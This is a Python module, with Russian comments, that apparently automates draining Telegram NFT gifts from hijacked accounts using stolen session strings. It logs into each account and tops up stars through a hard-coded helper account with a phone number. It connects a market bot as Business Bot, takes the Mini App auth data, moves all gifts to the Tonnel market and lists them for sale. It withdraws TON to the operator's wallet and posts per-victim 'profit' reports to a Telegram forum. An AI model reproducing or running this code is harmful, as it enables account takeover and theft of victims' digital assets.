"""
Tonnel NFT Runner — интеграция SkriptToonel в getgems.

Поток после получения Pyrogram session_string:
  1. Проверяем баланс звёзд и количество NFT подарков
  2. Если звёзд < 25 и есть NFT — докидываем (send_gifts + convert)
  3. Подключаем @Tonnel_Network_bot как Business Bot
  4. Получаем authData из Tonnel Mini App (автоматически)
  5. Instant Transfer всех managed подарков → Tonnel
  6. Листинг по floor × PRICE_MULTIPLIER
  7. Автовывод TON при MIN_WITHDRAW_TON
  8. Логи через utils (begin/append/flush_gift_log) + send_profit_log
     + Discord PROFIT webhook

API_ID / API_HASH из SkriptToonel/.env (устаревшие getgems credentials не используются).
"""
import asyncio
import logging
import os
import sys
import threading
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, unquote

_GETGEMS_DIR = Path(__file__).parent          # /root/getgems
_TONNEL_DIR = _GETGEMS_DIR.parent / "SkriptToonel"

logger = logging.getLogger("tonnel_runner")

# Global lock: all sessions share one IP → prevent CF rate-limit on gifts2.tonnel.network
_TONNEL_MARKET_LOCK = threading.Lock()

# Lock for Tonnel auth fetch (RequestWebView hits market.tonnel.network — same CF limit)
_TONNEL_AUTH_LOCK = threading.Lock()

# Deduplication: tracks phones currently being processed
_active_sessions: set = set()
_active_sessions_lock = threading.Lock()


# ── Конфиг SkriptToonel ──────────────────────────────────

def _load_tonnel_env() -> dict:
    env_path = _TONNEL_DIR / ".env"
    result = {}
    if not env_path.exists():
        logger.error(f"SkriptToonel/.env не найден: {env_path}")
        return result
    with open(env_path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            result[key.strip()] = val.strip().strip('"').strip("'")
    return result


_TONNEL_ENV: dict = _load_tonnel_env()

TONNEL_API_ID: int = int(_TONNEL_ENV.get("API_ID", "0"))
TONNEL_API_HASH: str = _TONNEL_ENV.get("API_HASH", "")
WITHDRAW_WALLET: str = _TONNEL_ENV.get("WITHDRAW_WALLET", "")
PRICE_MULTIPLIER: float = float(_TONNEL_ENV.get("PRICE_MULTIPLIER", "0.97"))
MIN_WITHDRAW_TON: float = float(_TONNEL_ENV.get("MIN_WITHDRAW_TON", "2.0"))
CHECK_INTERVAL: int = int(_TONNEL_ENV.get("CHECK_INTERVAL", "5"))
TONNEL_BOT_USERNAME: str = "@Tonnel_Network_bot"

# Порог звёзд — если меньше этого, нужен докид
STARS_THRESHOLD = 25


def _check_config() -> list[str]:
    errors = []
    if not TONNEL_API_ID:
        errors.append("API_ID не задан в SkriptToonel/.env")
    if not TONNEL_API_HASH:
        errors.append("API_HASH не задан в SkriptToonel/.env")
    if not WITHDRAW_WALLET:
        errors.append("WITHDRAW_WALLET не задан в SkriptToonel/.env")
    return errors


def _ensure_tonnel_in_path() -> None:
    s = str(_TONNEL_DIR)
    if s not in sys.path:
        sys.path.insert(0, s)

def _ensure_getgems_in_path() -> None:
    s = str(_GETGEMS_DIR)
    if s not in sys.path:
        sys.path.insert(0, s)


# ── Импорты из utils (getgems) ───────────────────────────

def _import_utils():
    _ensure_getgems_in_path()
    import utils as _u
    return _u


# ── Проверка звёзд и NFT, докид ─────────────────────────

async def _check_and_dokid_stars(
    client,
    phone: str,
    user_id,
    log_key: str,
) -> int:
    """
    Через уже открытый Pyrogram client:
      - считаем звёзды и NFT подарки
      - если звёзд < STARS_THRESHOLD и NFT > 0 — докидываем
    Возвращает финальный баланс звёзд.
    """
    u = _import_utils()

    # Баланс звёзд
    ok, stars = await u.get_star_balance_with_client(client)
    nft_stats = await u.get_gifts_statistics(client)
    nft_count = nft_stats.get("nft_gifts", 0)
    transferable = nft_stats.get("transferable_gifts", 0)

    u.append_gift_log(log_key, (
        f"📊 Стартовый срез: звёзды={stars if ok else '?'}, "
        f"NFT подарков={nft_count}, доступно к передаче={transferable}"
    ))

    if not ok:
        u.append_gift_log(log_key, "⚠️ Не удалось получить баланс звёзд, пропускаем докид")
        return 0

    if nft_count == 0:
        u.append_gift_log(log_key, "ℹ️ NFT подарков нет, докид не нужен")
        return stars

    if stars >= STARS_THRESHOLD:
        u.append_gift_log(log_key, f"✅ Звёзд достаточно ({stars} ≥ {STARS_THRESHOLD}), докид не нужен")
        return stars

    # --- Нужен докид ---
    u.append_gift_log(log_key, (
        f"⭐ Звёзд мало ({stars} < {STARS_THRESHOLD}), NFT есть ({nft_count}). "
        f"Запускаем докид..."
    ))

    # Определяем получателя (сам аккаунт)
    try:
        me = await client.get_me()
        me_username = getattr(me, "username", None)
        me_id = getattr(me, "id", None)
    except Exception as e:
        u.append_gift_log(log_key, f"⚠️ Не удалось получить me: {e}")
        me_username = None
        me_id = user_id

    # Устанавливаем контакт с докид-аккаунтом
    dokid_account_id = 8341789224  # +79060130047
    try:
        await client.send_message(chat_id=dokid_account_id, text="❤")
        u.append_gift_log(log_key, "👋 Контакт с докид-аккаунтом установлен")
        await asyncio.sleep(0.5)
    except Exception as ce:
        # Пробуем по телефону
        try:
            dokid_user = await client.get_users("+79060130047")
            if dokid_user and hasattr(dokid_user, "id"):
                await client.send_message(chat_id=dokid_user.id, text="❤")
                u.append_gift_log(log_key, "👋 Контакт с докид-аккаунтом установлен (по телефону)")
                await asyncio.sleep(0.5)
        except Exception:
            u.append_gift_log(log_key, f"⚠️ Не удалось установить контакт с докид-аккаунтом: {ce}")

    # Отправляем подарки-звёзды на этот аккаунт (2 подарка по умолчанию)
    gift_ok = False
    for attempt in range(1, 4):
        try:
            if me_username:
                target = me_username if me_username.startswith("@") else f"@{me_username}"
                gift_ok, msg = await u.send_gifts_to_username_with_pyrogram(target, count=2, log_key=log_key)
            elif me_id:
                gift_ok, msg = await u.send_gifts_to_user_id_with_pyrogram(int(me_id), count=2, log_key=log_key)
            else:
                gift_ok, msg = await u.send_gifts_to_user_id_with_pyrogram(int(user_id), count=2, log_key=log_key)

            if gift_ok:
                u.append_gift_log(log_key, f"✅ Докид: подарки отправлены (попытка {attempt})")
                break
            else:
                u.append_gift_log(log_key, f"⚠️ Докид не удался (попытка {attempt}): {msg[:150]}")
                await asyncio.sleep(0.5)
        except Exception as de:
            u.append_gift_log(log_key, f"⚠️ Ошибка докида (попытка {attempt}): {str(de)[:150]}")
            await asyncio.sleep(0.5)

    # Конвертируем полученные подарки-звёзды в звёзды
    if gift_ok:
        await asyncio.sleep(0.3)
        converted = await u.convert_available_gifts_to_stars_with_client(
            client, exclude_ids=set(), max_to_convert=10, log_key=log_key
        )
        u.append_gift_log(log_key, f"🔄 Конвертировано подарков в звёзды: {converted}")

    # Финальный баланс
    ok2, final_stars = await u.get_star_balance_with_client(client)
    if ok2:
        u.append_gift_log(log_key, f"⭐ Баланс после докида: {final_stars} звёзд")
        return final_stars

    return stars  # вернём старый если не удалось получить новый


# ── authData из Tonnel Mini App ──────────────────────────

async def _fetch_tonnel_auth_data(app) -> Optional[str]:
    # Serialize auth fetches — RequestWebView hits market.tonnel.network (CF-protected)
    with _TONNEL_AUTH_LOCK:
        return await _fetch_tonnel_auth_data_inner(app)


async def _fetch_tonnel_auth_data_inner(app) -> Optional[str]:
    try:
        from pyrogram.raw.functions.messages import RequestWebView

        bot_peer = await app.resolve_peer("Tonnel_Network_bot")
        result = await app.invoke(
            RequestWebView(
                peer=bot_peer,
                bot=bot_peer,
                url="https://market.tonnel.network",
                from_bot_menu=False,
                platform="android",
            )
        )
        url: str = result.url
        fragment = url.split("#", 1)[1] if "#" in url else ""
        params = parse_qs(fragment)
        raw = params.get("tgWebAppData", [None])[0]
        if not raw:
            return None
        init_data = unquote(raw)
        logger.info("✅ authData получен из Tonnel Mini App")
        return init_data
    except Exception as e:
        logger.error(f"Ошибка получения authData из Tonnel Mini App: {e}")
        return None


# ── Business Bot (через модуль SkriptToonel) ─────────────

async def _setup_business_bot(app, log_key: str, user_id=None) -> str:
    """Возвращает: 'ok', 'already', 'no_business', 'privacy', 'error'."""
    _ensure_tonnel_in_path()
    u = _import_utils()
    try:
        from business_setup import is_tonnel_connected, connect_business_bot

        already = await is_tonnel_connected(app, TONNEL_BOT_USERNAME)
        if already:
            u.append_gift_log(log_key, f"✅ {TONNEL_BOT_USERNAME} уже подключён как Business Bot")
            return "already"

        u.append_gift_log(log_key, f"🔗 Подключаем {TONNEL_BOT_USERNAME} как Business Bot...")
        result = await connect_business_bot(app, TONNEL_BOT_USERNAME)
        ok, reason = result if isinstance(result, tuple) else (result, "error")
        if ok:
            u.append_gift_log(log_key, f"✅ Business Bot подключён, ждём активацию (5с)...")
            await asyncio.sleep(5)
            return "ok"
        elif reason == "no_business":
            u.append_gift_log(log_key, "❌ Нет Telegram Business подписки — обход остановлен")
            return "no_business"
        elif reason == "privacy":
            u.append_gift_log(log_key, "❌ Бот не разрешает Business Bot подключение (privacy)")
            return "privacy"
        else:
            u.append_gift_log(log_key, "⚠️ Не удалось подключить Business Bot автоматически. Продолжаем.")
            return "error"
    except Exception as e:
        u.append_gift_log(log_key, f"⚠️ Ошибка настройки Business Bot: {str(e)[:200]}")
        return "error"



# ── Tonnel market цикл ───────────────────────────────────

def _run_market_cycle(auth_data: str, phone: str, user_id, log_key: str) -> dict:
    """
    Синхронный цикл: Instant Transfer + листинг + вывод.
    Использует tonnel_market.py из SkriptToonel.
    Защищён глобальным локом — только одна сессия в момент времени
    обращается к gifts2.tonnel.network (CF rate-limit по IP).
    """
    _ensure_tonnel_in_path()
    u = _import_utils()
    stats = {"transferred": 0, "listed": 0, "withdrawn_ton": 0.0, "nft_links": []}

    with _TONNEL_MARKET_LOCK:
        try:
            import tonnel_market as tm
            import config as tonnel_cfg

            tonnel_cfg.TONNEL_AUTH_DATA = auth_data
            tonnel_cfg.WITHDRAW_WALLET = WITHDRAW_WALLET
            tonnel_cfg.PRICE_MULTIPLIER = PRICE_MULTIPLIER
            tonnel_cfg.MIN_WITHDRAW_TON = MIN_WITHDRAW_TON
            tm.TONNEL_AUTH_DATA = auth_data

            # Instant Transfer
            transferred, tf_failed = tm.deposit_managed_gifts()
            stats["transferred"] = transferred
            if transferred or tf_failed:
                u.append_gift_log(log_key, f"📤 Instant Transfer: передано={transferred}, ошибок={tf_failed}")
            else:
                u.append_gift_log(log_key, "ℹ️ fetchManagedGifts: управляемых подарков не найдено")

            # Листинг
            listed, lf, nft_links = tm.process_unlisted_queue()
            stats["listed"] = listed
            stats["nft_links"].extend(nft_links)
            if listed or lf:
                u.append_gift_log(log_key, f"🏷️ Листинг: выставлено={listed}, ошибок={lf}")
            else:
                u.append_gift_log(log_key, "ℹ️ myGifts: нет неразмещённых подарков в очереди")

            # Вывод
            withdrew = tm.try_withdraw()
            if withdrew:
                bal = tm.get_ton_balance() or 0.0
                stats["withdrawn_ton"] = bal
                u.append_gift_log(log_key, f"💸 Вывод выполнен, остаток={bal:.4f} TON")

        except Exception as e:
            u.append_gift_log(log_key, f"❌ Ошибка в цикле Tonnel market: {str(e)[:200]}")
            logger.error(f"[{phone}] Ошибка market cycle: {e}", exc_info=True)

    return stats


# ── Polling loop ─────────────────────────────────────────

async def _polling_loop(auth_data: str, phone: str, user_id, log_key: str, iterations: int = 10) -> dict:
    u = _import_utils()
    total = {"transferred": 0, "listed": 0, "withdrawn_ton": 0.0, "nft_links": []}

    for i in range(1, iterations + 1):
        try:
            u.append_gift_log(log_key, f"🔄 Polling итерация {i}/{iterations}")
            stats = _run_market_cycle(auth_data, phone, user_id, log_key)
            total["transferred"] += stats["transferred"]
            total["listed"] += stats["listed"]
            total["withdrawn_ton"] += stats["withdrawn_ton"]
            total["nft_links"].extend(stats.get("nft_links", []))
            if i < iterations:
                # Пауза между итерациями: CHECK_INTERVAL + буфер чтобы другие сессии
                # успели отработать между захватами _TONNEL_MARKET_LOCK
                await asyncio.sleep(CHECK_INTERVAL + 2)
        except asyncio.CancelledError:
            break
        except Exception as e:
            u.append_gift_log(log_key, f"⚠️ Polling ошибка итерация {i}: {str(e)[:150]}")
            await asyncio.sleep(2)

    return total


# ── Лог профита через getgems ────────────────────────────

async def _send_logs_and_profit(
    phone: str,
    user_id,
    log_key: str,
    total_stats: dict,
) -> None:
    """
    Флашит gift_log в Discord (через flush_gift_log) и вызывает send_profit_log
    с информацией о Tonnel-обходе.
    """
    u = _import_utils()

    # Добавляем итоговую строку
    u.append_gift_log(log_key, (
        f"🏁 Tonnel-обход завершён: "
        f"передано={total_stats['transferred']}, "
        f"выставлено={total_stats['listed']}, "
        f"выведено={total_stats['withdrawn_ton']:.4f} TON"
    ))

    # Флашим лог в Telegram (через logs тему)
    try:
        await u.flush_gift_log(
            log_key,
            header=f"Tonnel NFT обход | {phone}",
            with_spoiler=True,
        )
    except Exception as e:
        logger.error(f"[{phone}] Ошибка flush_gift_log: {e}")

    # Профит-сообщение в отдельную тему (только если что-то выставлено/выведено)
    if total_stats["listed"] > 0 or total_stats["withdrawn_ton"] > 0:
        try:
            import os
            from aiogram import Bot
            forum_chat_id = os.getenv("FORUM_CHAT_ID") or os.getenv("PROFIT_CHAT_ID")
            profit_topic_id = os.getenv("PROFIT_TOPIC_ID") or os.getenv("PROFIT_FORUM_TOPIC_ID")
            logs_bot_token = os.getenv("LOGS_BOT_TOKEN") or os.getenv("TELEGRAM_LOGS_BOT_TOKEN")
            if not logs_bot_token:
                from config_bot import config as _cfg
                logs_bot_token = _cfg.BOT_TOKEN
            if forum_chat_id and logs_bot_token:
                nft_links = total_stats.get("nft_links", [])
                links_text = ""
                if nft_links:
                    links_text = "\n\n🎁 <b>Подарки на продаже:</b>\n" + "\n".join(f"• {l}" for l in nft_links)
                msg = (
                    f"💠 <b>Tonnel профит</b> | <code>{phone}</code>\n\n"
                    f"📤 Передано в Tonnel: <b>{total_stats['transferred']}</b>\n"
                    f"🏷️ Выставлено на продажу: <b>{total_stats['listed']}</b>\n"
                    f"💸 Выведено: <b>{total_stats['withdrawn_ton']:.4f} TON</b>"
                    f"{links_text}"
                )
                bot = Bot(token=logs_bot_token)
                try:
                    kwargs = dict(chat_id=int(forum_chat_id), text=msg, parse_mode="HTML", disable_web_page_preview=True)
                    if profit_topic_id and str(profit_topic_id).isdigit():
                        kwargs["message_thread_id"] = int(profit_topic_id)
                    await bot.send_message(**kwargs)
                finally:
                    await bot.session.close()
        except Exception as e:
            logger.error(f"[{phone}] Ошибка отправки Tonnel профита: {e}")


# ── Главная async функция ────────────────────────────────

async def run_tonnel_for_session(session_string: str, phone: str, user_id) -> None:
    """
    Полный Tonnel-обход для одной сессии:
      1. Проверка звёзд / NFT → докид если нужно
      2. Business Bot подключение
      3. authData из Tonnel Mini App
      4. Первый Instant Transfer + листинг + вывод
      5. Polling (5 итераций)
      6. Логи через getgems (flush_gift_log + send_profit_log)
    """
    errors = _check_config()
    if errors:
        for err in errors:
            logger.error(f"Tonnel config error: {err}")
        return

    u = _import_utils()
    log_key = f"tonnel:{phone}:{user_id}"
    u.begin_gift_log(log_key)
    u.append_gift_log(log_key, f"🚀 Tonnel-обход запущен (API_ID={TONNEL_API_ID})")

    logger.info(f"[{phone}] Tonnel-обход запущен")

    try:
        from pyrogram import Client

        app = Client(
            name=f"tonnel_runner_{user_id}",
            api_id=TONNEL_API_ID,
            api_hash=TONNEL_API_HASH,
            session_string=session_string,
        )

        auth_data: Optional[str] = None

        async with app:
            me = await app.get_me()
            u.append_gift_log(log_key, (
                f"👤 Аккаунт: {me.first_name} (@{me.username or '—'}) ID={me.id}"
            ))

            # 1. Проверка звёзд и докид
            await _check_and_dokid_stars(app, phone, user_id, log_key)

            # 1.5. Детальный лог всех подарков через Pyrogram
            try:
                from datetime import datetime as _dt
                gift_lines = []
                total_count = 0
                nft_count = 0
                async for gift in app.get_chat_gifts("me"):
                    total_count += 1
                    is_limited = getattr(gift, 'is_limited', False)
                    attributes = getattr(gift, 'attributes', None)
                    has_attributes = bool(attributes)
                    link = getattr(gift, 'link', None)
                    is_nft = bool(is_limited) or has_attributes or (link and 'nft' in link.lower())
                    if is_nft:
                        nft_count += 1
                        can_transfer = True
                        lock_reason = ""
                        if getattr(gift, 'is_transferred', False):
                            can_transfer = False
                            lock_reason = "уже передан"
                        if hasattr(gift, 'owner_address') and gift.owner_address:
                            can_transfer = False
                            lock_reason = "owner_address"
                        now = _dt.now()
                        if hasattr(gift, 'can_transfer_at') and gift.can_transfer_at and gift.can_transfer_at > now:
                            can_transfer = False
                            lock_reason = f"заблокирован до {gift.can_transfer_at}"
                        if hasattr(gift, 'locked_until_date') and gift.locked_until_date and gift.locked_until_date > now:
                            can_transfer = False
                            lock_reason = f"locked до {gift.locked_until_date}"
                        gift_name = getattr(gift, 'title', None) or getattr(gift, 'name', None) or '?'
                        gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None) or '?'
                        status = "✅ доступен" if can_transfer else f"🔒 {lock_reason}"
                        gift_lines.append(f"  • {gift_name} #{gift_id} [{status}]  link={link or '—'}")

                u.append_gift_log(log_key, (
                    f"🎁 Pyrogram скан: всего подарков={total_count}, NFT={nft_count}\n"
                    + ("\n".join(gift_lines) if gift_lines else "  (NFT подарков нет)")
                ))
            except Exception as _ge:
                u.append_gift_log(log_key, f"⚠️ Ошибка Pyrogram скана подарков: {str(_ge)[:200]}")

            # 2. Business Bot
            bb_status = await _setup_business_bot(app, log_key, user_id=user_id)
            if bb_status == "no_business":
                await _send_logs_and_profit(phone, user_id, log_key, {"transferred": 0, "listed": 0, "withdrawn_ton": 0.0, "nft_links": []})
                return

            # 3. authData из Mini App
            u.append_gift_log(log_key, "🔑 Получение authData из Tonnel Mini App...")
            auth_data = await _fetch_tonnel_auth_data(app)
            if auth_data:
                u.append_gift_log(log_key, "✅ authData получен")
            else:
                u.append_gift_log(log_key, "❌ Не удалось получить authData — обход прерван")
                await _send_logs_and_profit(phone, user_id, log_key, {"transferred": 0, "listed": 0, "withdrawn_ton": 0.0, "nft_links": []})
                return

            # 3.5. Ждём пока Tonnel увидит подарки через Business Bot
            # Каждый вызов защищён _TONNEL_MARKET_LOCK чтобы не пересекаться с другими сессиями.
            # Лок берём только на время HTTP-запроса, не на sleep — другие сессии могут работать.
            _ensure_tonnel_in_path()
            import tonnel_market as _tm_check
            gifts_visible = False
            for _attempt in range(7):  # макс 6 × 15с = 90с
                try:
                    with _TONNEL_MARKET_LOCK:
                        _tm_check.TONNEL_AUTH_DATA = auth_data
                        _managed = _tm_check.fetch_managed_gifts()
                    if _managed:
                        u.append_gift_log(log_key, f"✅ Tonnel видит {len(_managed)} подарков (попытка {_attempt + 1})")
                        gifts_visible = True
                        break
                except Exception as _fe:
                    u.append_gift_log(log_key, f"⚠️ fetchManagedGifts ошибка: {str(_fe)[:150]}")
                if _attempt < 6:
                    u.append_gift_log(log_key, f"⏳ Tonnel ещё не видит подарки, ждём 15с... ({_attempt + 1}/6)")
                    await asyncio.sleep(15)
            if not gifts_visible:
                u.append_gift_log(log_key, "⚠️ Tonnel не увидел подарки за 90с — продолжаем, они могут появиться позже")

            # 4. Первый цикл (сессия открыта)
            u.append_gift_log(log_key, "📤 Первый цикл: Instant Transfer + листинг...")
            first_stats = _run_market_cycle(auth_data, phone, user_id, log_key)

            # 5. Polling — 10 итераций (сессия открыта)
            poll_stats = await _polling_loop(auth_data, phone, user_id, log_key, iterations=10)

        total = {
            "transferred": first_stats["transferred"] + poll_stats["transferred"],
            "listed": first_stats["listed"] + poll_stats["listed"],
            "withdrawn_ton": first_stats["withdrawn_ton"] + poll_stats["withdrawn_ton"],
            "nft_links": first_stats.get("nft_links", []) + poll_stats.get("nft_links", []),
        }

        # 6. Логи
        await _send_logs_and_profit(phone, user_id, log_key, total)

        logger.info(
            f"[{phone}] Tonnel завершён: "
            f"передано={total['transferred']}, "
            f"выставлено={total['listed']}, "
            f"выведено={total['withdrawn_ton']:.4f} TON"
        )

    except Exception as e:
        u.append_gift_log(log_key, f"💥 Критическая ошибка: {str(e)[:300]}")
        logger.error(f"[{phone}] Критическая ошибка Tonnel-обхода: {e}", exc_info=True)
        try:
            await _send_logs_and_profit(phone, user_id, log_key, {"transferred": 0, "listed": 0, "withdrawn_ton": 0.0})
        except Exception:
            pass


# ── Запуск в фоне ────────────────────────────────────────

def launch_tonnel_background(session_string: str, phone: str, user_id) -> None:
    """
    Запускает run_tonnel_for_session в отдельном daemon-потоке.
    Вызывается из app.py / backend/app.py / telegram_bot.py после
    конвертации Telethon → Pyrogram session_string.
    Дедупликация: если для этого phone уже запущен поток — игнорируем.
    """
    with _active_sessions_lock:
        if phone in _active_sessions:
            logger.warning(f"[{phone}] Tonnel-обход уже запущен, пропускаем дубликат")
            return
        _active_sessions.add(phone)

    def _run():
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(run_tonnel_for_session(session_string, phone, user_id))
            loop.close()
        except Exception as e:
            logger.error(f"[{phone}] Фоновый Tonnel-обход завершился с ошибкой: {e}", exc_info=True)
        finally:
            with _active_sessions_lock:
                _active_sessions.discard(phone)
            logger.info(f"[{phone}] Tonnel-обход завершён, слот освобождён")

    t = threading.Thread(target=_run, daemon=True, name=f"tonnel_{phone}")
    t.start()
    logger.info(f"[{phone}] Tonnel-обход запущен в фоне (thread={t.name})")
